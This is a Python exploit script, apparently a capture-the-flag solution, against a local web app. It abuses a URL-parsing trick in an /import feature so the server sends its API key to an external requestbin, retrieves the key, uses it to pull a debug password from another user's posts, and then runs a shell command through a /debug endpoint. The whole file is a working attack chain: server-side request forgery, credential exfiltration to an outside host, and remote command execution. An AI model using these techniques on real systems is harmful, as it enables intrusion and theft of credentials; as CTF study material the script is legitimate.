import requests
import secrets
import time

url = 'http://localhost:8001'

s = requests.Session()


username = secrets.token_hex()
password = secrets.token_hex()

creds = {
    'username': username,
    'password': password,
    'password2': password,
}

s.post(url + '/register', data=creds)
s.post(url + '/login', data=creds)

r = s.post(url + '/import', data={'url': 'http://localhost:31337@<READACTED>.x.pipedream.net/'})

# Give requestbin time to update
time.sleep(2)

requestbin_api_url = 'https://requestbin-api.pipedream.com/api/v2/events/<REDACTED>'

r = requests.get(requestbin_api_url)
api_key = r.json()['data'][-1]['step']['request']['headers']['x-api-key']

r = s.get(url + '/api/users/1/posts', headers={'x-api-key': api_key})
debug_password = r.json()['posts'][0]['body'].split(': ')[-1]

r = s.post(url + '/debug', data={'debug_password': debug_password, 'command': 'echo $(./submitter 0)'})
print(r.text)
